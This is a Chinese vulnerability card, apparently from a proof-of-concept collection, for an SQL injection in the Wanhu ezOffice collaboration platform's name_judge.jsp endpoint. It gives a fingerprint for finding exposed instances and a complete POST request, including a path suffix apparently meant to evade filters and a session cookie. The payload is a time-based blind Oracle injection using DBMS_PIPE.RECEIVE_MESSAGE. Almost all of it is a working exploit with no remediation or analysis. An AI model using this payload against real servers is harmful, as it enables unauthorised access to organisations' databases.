# 万户ezOfficename_judge存在SQL注入漏洞

- **系统**：万户　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title="万户ezOFFICE协同管理平台"`
- **请求**：`POST /defaultroot/modules/govoffice/custom_documentmanager/name_judge.jsp;.js HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Cookie: OASESSIONID=EBC412E0A66224729E28BB774F632430`

**请求体 / payload**
```
formType=1+AND+1337=DBMS_PIPE.RECEIVE_MESSAGE('any',5)--&govFormName=&formId=
```
- **预期**：200　|　—